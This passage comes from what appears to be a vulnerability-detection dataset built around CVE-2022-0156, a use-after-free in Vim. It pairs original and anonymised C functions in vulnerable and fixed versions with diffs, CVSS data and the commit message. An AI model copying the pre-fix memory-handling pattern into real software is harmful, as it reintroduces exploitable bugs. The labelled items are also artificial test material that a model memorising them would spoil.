	for (VAR_6 = VAR_56.cmd; VAR_6 >= VAR_4; --VAR_6)
	{
	    if (*VAR_6 == ':')
		VAR_57 = TRUE;
	    if (VAR_6 < VAR_56.cmd && !VIM_ISWHITE(*VAR_6))
		break;
	}

	/* COMMENT_39 */
	VAR_6 = VAR_56.cmd;
	if (!(VAR_59.cmod_flags & VAR_38))
	{
	    if (checkforcmd(&VAR_56.cmd, ""call"", 3))
	    {
		if (*VAR_56.cmd == '(')
		    /* COMMENT_40 */
		    VAR_56.cmd = VAR_6;
		else
		    VAR_56.cmd = skipwhite(VAR_56.cmd);
	    }

	    if (!VAR_57)
	    {
		int	    VAR_68;

		/* COMMENT_41 */
		VAR_68 = may_compile_assignment(&VAR_56, &VAR_4, &VAR_8);
		if (VAR_68 == VAR_69)
		    goto nextline;
		if (VAR_68 == VAR_15)
		    goto erret;
	    }
	}

	/* COMMENT_42 */
                       
                                                      
                                       
                                            
    
	VAR_58 = VAR_56.cmd;
	if ((*VAR_58 != '$' || VAR_57)
		&& (VAR_57 || !(*VAR_58 == '\''
		       || (VAR_58[0] != VAR_60 && VAR_58[0] == VAR_58[1]
					    && (*VAR_58 == '+' || *VAR_58 == '-')))))
	{
	    VAR_56.cmd = skip_range(VAR_56.cmd, TRUE, NULL);
	    if (VAR_56.cmd > VAR_58)
	    {
		if (!VAR_57
				   && !(VAR_59.cmod_flags & VAR_38))
		{
		    semsg(_(VAR_70), VAR_58);
		    goto erret;
		}
		VAR_56.addr_count = 1;
		if (ends_excmd2(VAR_4, VAR_56.cmd))
		{
		    /* COMMENT_48 */
		    generate_EXEC(&VAR_8, VAR_71,
					      vim_strnsave(VAR_58, VAR_56.cmd - VAR_58));
		    VAR_4 = VAR_56.cmd;
		    goto nextline;
		}
	    }
	}
	VAR_6 = find_ex_command(&VAR_56, NULL,
		VAR_57 || (VAR_59.cmod_flags & VAR_38)
						  ? NULL : VAR_72, &VAR_8);

	if (VAR_6 == NULL)
	{
	    if (VAR_8.ctx_skip != VAR_62)
		emsg(_(VAR_73));
	    goto erret;
	}

	/* COMMENT_49 */
	if (VAR_59.cmod_flags & VAR_38)
	{
	    char_u *VAR_74 = VAR_56.cmd;

	    switch (VAR_56.cmdidx)
	    {
		case VAR_75:
		case VAR_76:
		case VAR_77:
		case VAR_78:
		case VAR_79:
		case VAR_80:
		case VAR_81:
		case VAR_82:
		case VAR_83:
		case VAR_84:
		case VAR_85:
		case VAR_86:
		case VAR_87:
		case VAR_88:
			semsg(_(VAR_89), VAR_56.cmd);
			goto erret;
		default: break;
	    }

	    /* COMMENT_50 */
	    if (checkforcmd(&VAR_74, ""return"", 4))
		VAR_56.cmdidx = VAR_90;
	    else
		VAR_56.cmdidx = VAR_91;
	}

	if (VAR_6 == VAR_56.cmd && VAR_56.cmdidx != VAR_92)
	{
	    if (VAR_8.ctx_skip == VAR_62 && VAR_56.cmdidx != VAR_93)
	    {
		VAR_4 += STRLEN(VAR_4);
		goto nextline;
	    }
	    else if (VAR_56.cmdidx != VAR_93)
	    {
		/* COMMENT_51 */
		/* COMMENT_52 */
		semsg(_(VAR_94), VAR_56.cmd);
		goto erret;
	    }
	}

	if (VAR_8.ctx_had_return
		&& VAR_56.cmdidx != VAR_76
		&& VAR_56.cmdidx != VAR_77
		&& VAR_56.cmdidx != VAR_78
		&& VAR_56.cmdidx != VAR_80
		&& VAR_56.cmdidx != VAR_84
		&& VAR_56.cmdidx != VAR_86
		&& VAR_56.cmdidx != VAR_87
		&& VAR_56.cmdidx != VAR_88)
	{
	    emsg(_(VAR_95));
	    goto erret;
	}

	VAR_6 = skipwhite(VAR_6);
	if (VAR_56.cmdidx != VAR_92
			    && VAR_56.cmdidx != VAR_96 && VAR_56.cmdidx != VAR_97)
	{
	    if (VAR_56.cmdidx >= 0)
		VAR_56.argt = excmd_get_argt(VAR_56.cmdidx);
	    if ((VAR_56.argt & VAR_98) && *VAR_6 == '!')
	    {
		VAR_56.forceit = TRUE;
		VAR_6 = skipwhite(VAR_6 + 1);
	    }
	}

	switch (VAR_56.cmdidx)
	{
	    case VAR_99:
	    case VAR_100:
		    VAR_56.arg = VAR_6;
		    VAR_4 = compile_nested_function(&VAR_56, &VAR_8, &VAR_5);
		    break;

	    case VAR_90:
		    VAR_4 = compile_return(VAR_6, VAR_1,
				 VAR_59.cmod_flags & VAR_38, &VAR_8);
		    VAR_8.ctx_had_return = TRUE;
		    break;

	    case VAR_101:
		    emsg(_(VAR_102));
		    break;
	    case VAR_103:
	    case VAR_104:
	    case VAR_105:
	    case VAR_106:
	    case VAR_107:
		    VAR_4 = compile_assignment(VAR_6, &VAR_56, VAR_56.cmdidx, &VAR_8);
		    if (VAR_4 == VAR_6)
			VAR_4 = NULL;
		    break;

	    case VAR_108:
	    case VAR_109:
	    case VAR_110:
		    VAR_4 = compile_unletlock(VAR_6, &VAR_56, &VAR_8);
		    break;

	    case VAR_111:
		    emsg(_(VAR_112));
		    VAR_4 = NULL;
		    break;

	    case VAR_75:
		    VAR_4 = compile_if(VAR_6, &VAR_8);
		    break;
	    case VAR_76:
		    VAR_4 = compile_elseif(VAR_6, &VAR_8);
		    VAR_8.ctx_had_return = FALSE;
		    break;
	    case VAR_77:
		    VAR_4 = compile_else(VAR_6, &VAR_8);
		    VAR_8.ctx_had_return = FALSE;
		    break;
	    case VAR_78:
		    VAR_4 = compile_endif(VAR_6, &VAR_8);
		    break;

	    case VAR_83:
		    VAR_4 = compile_while(VAR_6, &VAR_8);
		    break;
	    case VAR_84:
		    VAR_4 = compile_endwhile(VAR_6, &VAR_8);
		    VAR_8.ctx_had_return = FALSE;
		    break;

	    case VAR_79:
		    VAR_4 = compile_for(VAR_6, &VAR_8);
		    break;
	    case VAR_80:
		    VAR_4 = compile_endfor(VAR_6, &VAR_8);
		    VAR_8.ctx_had_return = FALSE;
		    break;
	    case VAR_81:
		    VAR_4 = compile_continue(VAR_6, &VAR_8);
		    break;
	    case VAR_82:
		    VAR_4 = compile_break(VAR_6, &VAR_8);
		    break;

	    case VAR_85:
		    VAR_4 = compile_try(VAR_6, &VAR_8);
		    break;
	    case VAR_86:
		    VAR_4 = compile_catch(VAR_6, &VAR_8);
		    VAR_8.ctx_had_return = FALSE;
		    break;
	    case VAR_87:
		    VAR_4 = compile_finally(VAR_6, &VAR_8);
		    VAR_8.ctx_had_return = FALSE;
		    break;
	    case VAR_88:
		    VAR_4 = compile_endtry(VAR_6, &VAR_8);
		    VAR_8.ctx_had_return = FALSE;
		    break;
	    case VAR_113:
		    VAR_4 = compile_throw(VAR_6, &VAR_8);
		    break;

	    case VAR_93:
		    VAR_4 = compile_eval(VAR_6, &VAR_8);
		    break;

	    case VAR_114:
	    case VAR_115:
	    case VAR_116:
	    case VAR_117:
	    case VAR_118:
	    case VAR_119:
		    VAR_4 = compile_mult_expr(VAR_6, VAR_56.cmdidx, &VAR_8);
		    break;

	    case VAR_120:
		    VAR_56.cmd = VAR_58;
		    VAR_4 = compile_put(VAR_6, &VAR_56, &VAR_8);
		    break;

	    case VAR_121:
		    if (check_global_and_subst(VAR_56.cmd, VAR_6) == VAR_15)
			goto erret;
		    if (VAR_8.ctx_skip == VAR_62)
			VAR_4 = (char_u *)"""";
		    else
		    {
			VAR_56.arg = VAR_6;
			VAR_4 = compile_substitute(VAR_4, &VAR_56, &VAR_8);
		    }
		    break;

	    case VAR_122:
		    VAR_56.arg = VAR_6;
		    VAR_4 = compile_redir(VAR_4, &VAR_56, &VAR_8);
		    break;

	    case VAR_123:
	    case VAR_124:
	    case VAR_125:
	    case VAR_126:
	    case VAR_127:
	    case VAR_128:
#ifdef VAR_129
		    VAR_56.arg = VAR_6;
		    VAR_4 = compile_cexpr(VAR_4, &VAR_56, &VAR_8);
#else
		    ex_ni(&VAR_56);
		    VAR_4 = NULL;
#endif
		    break;

	    case VAR_130:
	    case VAR_131:
	    case VAR_132:
	    case VAR_133:
	    case VAR_134:
	    case VAR_135:
		    not_in_vim9(&VAR_56);
		    goto erret;

	    case VAR_92:
		    if (VAR_8.ctx_skip != VAR_62)
		    {
			semsg(_(VAR_136), VAR_56.cmd);
			goto erret;
		    }
		    /* COMMENT_53 */
		    VAR_4 = (char_u *)"""";
		    break;

	    case VAR_137:
	    case VAR_138:
	    case VAR_139:
	    case VAR_140:
	    case VAR_141:
	    case VAR_142:
	    case VAR_143:
	    case VAR_144:
	    case VAR_145:
		    VAR_56.arg = VAR_6;
		    if (vim_strchr(VAR_4, '\n') == NULL)
			VAR_4 = compile_exec(VAR_4, &VAR_56, &VAR_8);
		    else
			/* COMMENT_54 */
			/* COMMENT_55 */
			VAR_4 = compile_script(VAR_4, &VAR_8);
		    break;

	    case VAR_146:
		    if (check_global_and_subst(VAR_56.cmd, VAR_6) == VAR_15)
			goto erret;
		    /* COMMENT_56 */
	    default:
		    /* COMMENT_57 */
		    VAR_56.arg = VAR_6;
		    VAR_4 = compile_exec(VAR_4, &VAR_56, &VAR_8);
		    break;
	}
nextline:
	if (VAR_4 == NULL)
	    goto erret;
	VAR_4 = skipwhite(VAR_4);

	/* COMMENT_58 */
	generate_undo_cmdmods(&VAR_8);

	if (VAR_8.ctx_type_stack.ga_len < 0)
	{
	    iemsg(""Type stack underflow"");
	    goto erret;
	}
    }

    if (VAR_8.ctx_scope != NULL)
    {
	if (VAR_8.ctx_scope->se_type == VAR_147)
	    emsg(_(VAR_148));
	else if (VAR_8.ctx_scope->se_type == VAR_149)
	    emsg(_(VAR_150));
	else if (VAR_8.ctx_scope->se_type == VAR_151)
	    emsg(_(VAR_152));
	else
	    emsg(_(VAR_153));
	goto erret;
    }

    if (!VAR_8.ctx_had_return)
    {
	if (VAR_0->uf_ret_type->tt_type == VAR_154)
	    VAR_0->uf_ret_type = &VAR_155;
	else if (VAR_0->uf_ret_type->tt_type != VAR_156)
	{
	    emsg(_(VAR_157));
	    goto erret;
	}

	/* COMMENT_59 */
	generate_instr(&VAR_8, VAR_158);
    }

    /* COMMENT_60 */
    /* COMMENT_61 */
    if (VAR_159 == 0 || VAR_13 == VAR_12)
    {
	dfunc_T	*VAR_27 = ((dfunc_T *)VAR_28.ga_data)
							 + VAR_0->uf_dfunc_idx;
	VAR_27->df_deleted = FALSE;
	VAR_27->df_script_seq = VAR_17.sc_seq;
#ifdef VAR_24
	if (VAR_8.ctx_compile_type == VAR_30)
	{
	    VAR_27->df_instr_prof = VAR_9->ga_data;
	    VAR_27->df_instr_prof_count = VAR_9->ga_len;
	}
	else
#endif
	if (VAR_8.ctx_compile_type == VAR_32)
	{
	    VAR_27->df_instr_debug = VAR_9->ga_data;
	    VAR_27->df_instr_debug_count = VAR_9->ga_len;
	}
	else
	{
	    VAR_27->df_instr = VAR_9->ga_data;
	    VAR_27->df_instr_count = VAR_9->ga_len;
	}
	VAR_27->df_varcount = VAR_27->df_var_names.ga_len;
	VAR_27->df_has_closure = VAR_8.ctx_has_closure;
	if (VAR_8.ctx_outer_used)
	    VAR_0->uf_flags |= VAR_160;
	VAR_0->uf_def_status = VAR_161;
    }

    VAR_14 = VAR_69;

erret:
    if (VAR_0->uf_def_status == VAR_33)
    {
	dfunc_T	*VAR_27 = ((dfunc_T *)VAR_28.ga_data)
							 + VAR_0->uf_dfunc_idx;

	/* COMMENT_62 */
	clear_instr_ga(VAR_9);
	VIM_CLEAR(VAR_27->df_name);
	ga_clear_strings(&VAR_27->df_var_names);

	/* COMMENT_63 */
	/* COMMENT_64 */
	if (!VAR_27->df_deleted && VAR_23
			    && VAR_0->uf_dfunc_idx == VAR_28.ga_len - 1)
	{
	    --VAR_28.ga_len;
	    VAR_0->uf_dfunc_idx = 0;
	}
	VAR_0->uf_def_status = VAR_162;

	while (VAR_8.ctx_scope != NULL)
	    drop_scope(&VAR_8);

	if (VAR_7 != NULL)
	    emsg(VAR_7);
	else if (VAR_11 == VAR_10)
	    emsg(_(VAR_163));
    }

    if (VAR_8.ctx_redir_lhs.lhs_name != NULL)
    {
	if (VAR_14 == VAR_69)
	{
	    emsg(_(VAR_164));
	    VAR_14 = VAR_15;
	}
	vim_free(VAR_8.ctx_redir_lhs.lhs_name);
	vim_free(VAR_8.ctx_redir_lhs.lhs_whole);
    }

    VAR_17 = VAR_16;
    VAR_19 = VAR_18;
    VAR_21.cmod_flags =	VAR_20;
    if (VAR_22)
	estack_pop();

    ga_clear_strings(&VAR_5);
    free_imported(&VAR_8);
    free_locals(&VAR_8);
    ga_clear(&VAR_8.ctx_type_stack);
    return VAR_14;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/vim9compile.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -6,7 +6,7 @@
 	cctx_T		*outer_cctx)
 {
     char_u	*line = NULL;
-    char_u	*line_to_free = NULL;
+    garray_T	lines_to_free;
     char_u	*p;
     char	*errormsg = NULL;	// error message
     cctx_T	cctx;
@@ -24,6 +24,9 @@
 #endif
     int		debug_lnum = -1;
 
+    // allocated lines are freed at the end
+    ga_init2(&lines_to_free, sizeof(char_u *), 50);
+
     // When using a function that was compiled before: Free old instructions.
     // The index is reused.  Otherwise add a new entry in ""def_functions"".
     if (ufunc->uf_dfunc_idx > 0)
@@ -191,8 +194,8 @@
 	    if (line != NULL)
 	    {
 		line = vim_strsave(line);
-		vim_free(line_to_free);
-		line_to_free = line;
+		if (ga_add_string(&lines_to_free, line) == FAIL)
+		    goto erret;
 	    }
 	}
 
@@ -436,7 +439,7 @@
 	    case CMD_def:
 	    case CMD_function:
 		    ea.arg = p;
-		    line = compile_nested_function(&ea, &cctx, &line_to_free);
+		    line = compile_nested_function(&ea, &cctx, &lines_to_free);
 		    break;
 
 	    case CMD_return:
@@ -746,7 +749,7 @@
     if (do_estack_push)
 	estack_pop();
 
-    vim_free(line_to_free);
+    ga_clear_strings(&lines_to_free);
     free_imported(&cctx);
     free_locals(&cctx);
     ga_clear(&cctx.ctx_type_stack);","{'deleted_lines': ['    char_u\t*line_to_free = NULL;', '\t\tvim_free(line_to_free);', '\t\tline_to_free = line;', '\t\t    line = compile_nested_function(&ea, &cctx, &line_to_free);', '    vim_free(line_to_free);'], 'added_lines': ['    garray_T\tlines_to_free;', '    // allocated lines are freed at the end', '    ga_init2(&lines_to_free, sizeof(char_u *), 50);', '', '\t\tif (ga_add_string(&lines_to_free, line) == FAIL)', '\t\t    goto erret;', '\t\t    line = compile_nested_function(&ea, &cctx, &lines_to_free);', '    ga_clear_strings(&lines_to_free);']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/usercmd.c,may_get_cmd_block,"char_u *
may_get_cmd_block(exarg_T *eap, char_u *p, char_u **tofree, int *flags)
{
char_u *retp = p;
if (*p == '{' && ends_excmd2(eap->arg, skipwhite(p + 1))
&& eap->getline != NULL)
{
garray_T    ga;
char_u    *line = NULL;
ga_init2(&ga, sizeof(char_u *), 10);
if (ga_add_string(&ga, p) == FAIL)
return retp;
if (p[STRLEN(p) - 1] != '}')
for (;;)
{
vim_free(line);
if ((line = eap->getline(':', eap->cookie,
0, GETLINE_CONCAT_CONTBAR)) == NULL)
{
emsg(_(e_missing_rcurly));
break;
}
if (ga_add_string(&ga, line) == FAIL)
break;
if (*skipwhite(line) == '}')
break;
}
vim_free(line);
retp = *tofree = ga_concat_strings(&ga, ""\n"");
ga_clear_strings(&ga);
*flags |= UC_VIM9;
}
return retp;
}","char_u *
may_get_cmd_block(exarg_T *VAR_0, char_u *VAR_1, char_u **VAR_2, int *VAR_3)
{
char_u *VAR_4 = VAR_1;
if (*VAR_1 == '{' && ends_excmd2(VAR_0->arg, skipwhite(VAR_1 + 1))
&& VAR_0->getline != NULL)
{
garray_T    VAR_5;
char_u    *VAR_6 = NULL;
ga_init2(&VAR_5, sizeof(char_u *), 10);
if (ga_add_string(&VAR_5, VAR_1) == VAR_7)
return VAR_4;
if (VAR_1[STRLEN(VAR_1) - 1] != '}')
for (;;)
{
vim_free(VAR_6);
if ((VAR_6 = VAR_0->getline(':', VAR_0->cookie,
0, VAR_8)) == NULL)
{
emsg(_(VAR_9));
break;
}
if (ga_add_string(&VAR_5, VAR_6) == VAR_7)
break;
if (*skipwhite(VAR_6) == '}')
break;
}
vim_free(VAR_6);
VAR_4 = *VAR_2 = ga_concat_strings(&VAR_5, ""\n"");
ga_clear_strings(&VAR_5);
*VAR_3 |= VAR_10;
}
return VAR_4;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/usercmd.c/vul/before/0.json,"char_u *
may_get_cmd_block(exarg_T *eap, char_u *p, char_u **tofree, int *flags)
{
    char_u *retp = p;

    if (*p == '{' && ends_excmd2(eap->arg, skipwhite(p + 1))
						       && eap->getline != NULL)
    {
	garray_T    ga;
	char_u	    *line = NULL;

	ga_init2(&ga, sizeof(char_u *), 10);
	if (ga_copy_string(&ga, p) == FAIL)
	    return retp;

	// If the argument ends in ""}"" it must have been concatenated already
	// for ISN_EXEC.
	if (p[STRLEN(p) - 1] != '}')
	    // Read lines between '{' and '}'.  Does not support nesting or
	    // here-doc constructs.
	    for (;;)
	    {
		vim_free(line);
		if ((line = eap->getline(':', eap->cookie,
					   0, GETLINE_CONCAT_CONTBAR)) == NULL)
		{
		    emsg(_(e_missing_rcurly));
		    break;
		}
		if (ga_copy_string(&ga, line) == FAIL)
		    break;
		if (*skipwhite(line) == '}')
		    break;
	    }
	vim_free(line);
	retp = *tofree = ga_concat_strings(&ga, ""\n"");
	ga_clear_strings(&ga);
	*flags |= UC_VIM9;
    }
    return retp;
}","char_u *
may_get_cmd_block(exarg_T *VAR_0, char_u *VAR_1, char_u **VAR_2, int *VAR_3)
{
    char_u *VAR_4 = VAR_1;

    if (*VAR_1 == '{' && ends_excmd2(VAR_0->arg, skipwhite(VAR_1 + 1))
						       && VAR_0->getline != NULL)
    {
	garray_T    VAR_5;
	char_u	    *VAR_6 = NULL;

	ga_init2(&VAR_5, sizeof(char_u *), 10);
	if (ga_copy_string(&VAR_5, VAR_1) == VAR_7)
	    return VAR_4;

	/* COMMENT_0 */
	/* COMMENT_1 */
	if (VAR_1[STRLEN(VAR_1) - 1] != '}')
	    /* COMMENT_2 */
	    /* COMMENT_3 */
	    for (;;)
	    {
		vim_free(VAR_6);
		if ((VAR_6 = VAR_0->getline(':', VAR_0->cookie,
					   0, VAR_8)) == NULL)
		{
		    emsg(_(VAR_9));
		    break;
		}
		if (ga_copy_string(&VAR_5, VAR_6) == VAR_7)
		    break;
		if (*skipwhite(VAR_6) == '}')
		    break;
	    }
	vim_free(VAR_6);
	VAR_4 = *VAR_2 = ga_concat_strings(&VAR_5, ""\n"");
	ga_clear_strings(&VAR_5);
	*VAR_3 |= VAR_10;
    }
    return VAR_4;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/usercmd.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -10,7 +10,7 @@
 	char_u	    *line = NULL;
 
 	ga_init2(&ga, sizeof(char_u *), 10);
-	if (ga_add_string(&ga, p) == FAIL)
+	if (ga_copy_string(&ga, p) == FAIL)
 	    return retp;
 
 	// If the argument ends in ""}"" it must have been concatenated already
@@ -27,7 +27,7 @@
 		    emsg(_(e_missing_rcurly));
 		    break;
 		}
-		if (ga_add_string(&ga, line) == FAIL)
+		if (ga_copy_string(&ga, line) == FAIL)
 		    break;
 		if (*skipwhite(line) == '}')
 		    break;","{'deleted_lines': ['\tif (ga_add_string(&ga, p) == FAIL)', '\t\tif (ga_add_string(&ga, line) == FAIL)'], 'added_lines': ['\tif (ga_copy_string(&ga, p) == FAIL)', '\t\tif (ga_copy_string(&ga, line) == FAIL)']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/userfunc.c,get_function_args,"static int
get_function_args(
char_u**argp,
char_uendchar,
garray_T*newargs,
garray_T*argtypes,    inttypes_optional,    evalarg_T*evalarg,    int*varargs,
garray_T*default_args,
intskip,
exarg_T*eap,
char_u**line_to_free)
{
intmustend = FALSE;
char_u*arg;
char_u*p;
intc;
intany_default = FALSE;
char_u*expr;
char_u*whitep = *argp;
if (newargs != NULL)
ga_init2(newargs, (int)sizeof(char_u *), 3);
if (argtypes != NULL)
ga_init2(argtypes, (int)sizeof(char_u *), 3);
if (!skip && default_args != NULL)
ga_init2(default_args, (int)sizeof(char_u *), 3);
if (varargs != NULL)
*varargs = FALSE;
arg = skipwhite(*argp);
p = arg;
while (*p != endchar)
{
while (eap != NULL && eap->getline != NULL
&& (*p == NUL || (VIM_ISWHITE(*whitep) && *p == '#')))
{
char_u *theline = get_function_line(eap, line_to_free, 0,
GETLINE_CONCAT_CONT);
if (theline == NULL)
break;
whitep = (char_u *)"" "";
p = skipwhite(theline);
}
if (mustend && *p != endchar)
{
if (!skip)
semsg(_(e_invalid_argument_str), *argp);
goto err_ret;
}
if (*p == endchar)
break;
if (p[0] == '.' && p[1] == '.' && p[2] == '.')
{
if (varargs != NULL)
*varargs = TRUE;
p += 3;
mustend = TRUE;
if (argtypes != NULL)
{
if (!eval_isnamec1(*p))
{
if (!skip)
emsg(_(e_missing_name_after_dots));
goto err_ret;
}
arg = p;
p = one_function_arg(p, newargs, argtypes, types_optional,
evalarg, TRUE, skip);
if (p == arg)
break;
if (*skipwhite(p) == '=')
{
emsg(_(e_cannot_use_default_for_variable_arguments));
break;
}
}
}
else
{
char_u *np;
arg = p;
p = one_function_arg(p, newargs, argtypes, types_optional,
evalarg, FALSE, skip);
if (p == arg)
break;
np = skipwhite(p);
if (*np == '=' && np[1] != '=' && np[1] != '~'
&& default_args != NULL)
{
typval_Trettv;
any_default = TRUE;
p = skipwhite(p) + 1;
whitep = p;
p = skipwhite(p);
expr = p;
if (eval1(&p, &rettv, NULL) != FAIL)
{
if (!skip)
{
if (ga_grow(default_args, 1) == FAIL)
goto err_ret;
while (p > expr && VIM_ISWHITE(p[-1]))
p--;
c = *p;
*p = NUL;
expr = vim_strsave(expr);
if (expr == NULL)
{
*p = c;
goto err_ret;
}
((char_u **)(default_args->ga_data))
[default_args->ga_len] = expr;
default_args->ga_len++;
*p = c;
}
}
else
mustend = TRUE;
}
else if (any_default)
{
emsg(_(e_non_default_argument_follows_default_argument));
goto err_ret;
}
if (VIM_ISWHITE(*p) && *skipwhite(p) == ',')
{
if (!skip)
{
semsg(_(e_no_white_space_allowed_before_str_str), "","", p);
goto err_ret;
}
p = skipwhite(p);
}
if (*p == ',')
{
++p;
if (!skip && argtypes != NULL
&& !IS_WHITE_OR_NUL(*p) && *p != endchar)
{
semsg(_(e_white_space_required_after_str_str), "","", p - 1);
goto err_ret;
}
}
else
mustend = TRUE;
}
whitep = p;
p = skipwhite(p);
}
if (*p != endchar)
goto err_ret;
++p;
*argp = p;
return OK;
err_ret:
if (newargs != NULL)
ga_clear_strings(newargs);
if (!skip && default_args != NULL)
ga_clear_strings(default_args);
return FAIL;
}","static int
get_function_args(
char_u**VAR_0,
char_uVAR_1,
garray_T*VAR_2,
garray_T*VAR_3,
intVAR_4,
evalarg_T*VAR_5,
int*VAR_6,
garray_T*VAR_7,
intVAR_8,
exarg_T*VAR_9,
char_u**VAR_10)
{
intVAR_11 = FALSE;
char_u*VAR_12;
char_u*VAR_13;
intVAR_14;
intVAR_15 = FALSE;
char_u*VAR_16;
char_u*VAR_17 = *VAR_0;
if (VAR_2 != NULL)
ga_init2(VAR_2, (int)sizeof(char_u *), 3);
if (VAR_3 != NULL)
ga_init2(VAR_3, (int)sizeof(char_u *), 3);
if (!VAR_8 && VAR_7 != NULL)
ga_init2(VAR_7, (int)sizeof(char_u *), 3);
if (VAR_6 != NULL)
*VAR_6 = FALSE;
VAR_12 = skipwhite(*VAR_0);
VAR_13 = VAR_12;
while (*VAR_13 != VAR_1)
{
while (VAR_9 != NULL && VAR_9->getline != NULL
&& (*VAR_13 == VAR_18 || (VIM_ISWHITE(*VAR_17) && *VAR_13 == '#')))
{
char_u *VAR_19 = get_function_line(VAR_9, VAR_10, 0,
VAR_20);
if (VAR_19 == NULL)
break;
VAR_17 = (char_u *)"" "";
VAR_13 = skipwhite(VAR_19);
}
if (VAR_11 && *VAR_13 != VAR_1)
{
if (!VAR_8)
semsg(_(VAR_21), *VAR_0);
goto err_ret;
}
if (*VAR_13 == VAR_1)
break;
if (VAR_13[0] == '.' && VAR_13[1] == '.' && VAR_13[2] == '.')
{
if (VAR_6 != NULL)
*VAR_6 = TRUE;
VAR_13 += 3;
VAR_11 = TRUE;
if (VAR_3 != NULL)
{
if (!eval_isnamec1(*VAR_13))
{
if (!VAR_8)
emsg(_(VAR_22));
goto err_ret;
}
VAR_12 = VAR_13;
VAR_13 = one_function_arg(VAR_13, VAR_2, VAR_3, VAR_4,
VAR_5, TRUE, VAR_8);
if (VAR_13 == VAR_12)
break;
if (*skipwhite(VAR_13) == '=')
{
emsg(_(VAR_23));
break;
}
}
}
else
{
char_u *VAR_24;
VAR_12 = VAR_13;
VAR_13 = one_function_arg(VAR_13, VAR_2, VAR_3, VAR_4,
VAR_5, FALSE, VAR_8);
if (VAR_13 == VAR_12)
break;
VAR_24 = skipwhite(VAR_13);
if (*VAR_24 == '=' && VAR_24[1] != '=' && VAR_24[1] != '~'
&& VAR_7 != NULL)
{
typval_TVAR_25;
VAR_15 = TRUE;
VAR_13 = skipwhite(VAR_13) + 1;
VAR_17 = VAR_13;
VAR_13 = skipwhite(VAR_13);
VAR_16 = VAR_13;
if (eval1(&VAR_13, &VAR_25, NULL) != VAR_26)
{
if (!VAR_8)
{
if (ga_grow(VAR_7, 1) == VAR_26)
goto err_ret;
while (VAR_13 > VAR_16 && VIM_ISWHITE(VAR_13[-1]))
VAR_13--;
VAR_14 = *VAR_13;
*VAR_13 = VAR_18;
VAR_16 = vim_strsave(VAR_16);
if (VAR_16 == NULL)
{
*VAR_13 = VAR_14;
goto err_ret;
}
((char_u **)(VAR_7->ga_data))
[VAR_7->ga_len] = VAR_16;
VAR_7->ga_len++;
*VAR_13 = VAR_14;
}
}
else
VAR_11 = TRUE;
}
else if (VAR_15)
{
emsg(_(VAR_27));
goto err_ret;
}
if (VIM_ISWHITE(*VAR_13) && *skipwhite(VAR_13) == ',')
{
if (!VAR_8)
{
semsg(_(VAR_28), "","", VAR_13);
goto err_ret;
}
VAR_13 = skipwhite(VAR_13);
}
if (*VAR_13 == ',')
{
++VAR_13;
if (!VAR_8 && VAR_3 != NULL
&& !IS_WHITE_OR_NUL(*VAR_13) && *VAR_13 != VAR_1)
{
semsg(_(VAR_29), "","", VAR_13 - 1);
goto err_ret;
}
}
else
VAR_11 = TRUE;
}
VAR_17 = VAR_13;
VAR_13 = skipwhite(VAR_13);
}
if (*VAR_13 != VAR_1)
goto err_ret;
++VAR_13;
*VAR_0 = VAR_13;
return VAR_30;
err_ret:
if (VAR_2 != NULL)
ga_clear_strings(VAR_2);
if (!VAR_8 && VAR_7 != NULL)
ga_clear_strings(VAR_7);
return VAR_26;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/before/0.json,"static int
get_function_args(
    char_u	**argp,
    char_u	endchar,
    garray_T	*newargs,
    garray_T	*argtypes,	// NULL unless using :def
    int		types_optional,	// types optional if ""argtypes"" is not NULL
    evalarg_T	*evalarg,	// context or NULL
    int		*varargs,
    garray_T	*default_args,
    int		skip,
    exarg_T	*eap,
    garray_T	*lines_to_free)
{
    int		mustend = FALSE;
    char_u	*arg;
    char_u	*p;
    int		c;
    int		any_default = FALSE;
    char_u	*expr;
    char_u	*whitep = *argp;

    if (newargs != NULL)
	ga_init2(newargs, (int)sizeof(char_u *), 3);
    if (argtypes != NULL)
	ga_init2(argtypes, (int)sizeof(char_u *), 3);
    if (!skip && default_args != NULL)
	ga_init2(default_args, (int)sizeof(char_u *), 3);

    if (varargs != NULL)
	*varargs = FALSE;

    /*
     * Isolate the arguments: ""arg1, arg2, ...)""
     */
    arg = skipwhite(*argp);
    p = arg;
    while (*p != endchar)
    {
	while (eap != NULL && eap->getline != NULL
			 && (*p == NUL || (VIM_ISWHITE(*whitep) && *p == '#')))
	{
	    // End of the line, get the next one.
	    char_u *theline = get_function_line(eap, lines_to_free, 0,
							  GETLINE_CONCAT_CONT);

	    if (theline == NULL)
		break;
	    whitep = (char_u *)"" "";
	    p = skipwhite(theline);
	}

	if (mustend && *p != endchar)
	{
	    if (!skip)
		semsg(_(e_invalid_argument_str), *argp);
	    goto err_ret;
	}
	if (*p == endchar)
	    break;

	if (p[0] == '.' && p[1] == '.' && p[2] == '.')
	{
	    if (varargs != NULL)
		*varargs = TRUE;
	    p += 3;
	    mustend = TRUE;

	    if (argtypes != NULL)
	    {
		// ...name: list<type>
		if (!eval_isnamec1(*p))
		{
		    if (!skip)
			emsg(_(e_missing_name_after_dots));
		    goto err_ret;
		}

		arg = p;
		p = one_function_arg(p, newargs, argtypes, types_optional,
							  evalarg, TRUE, skip);
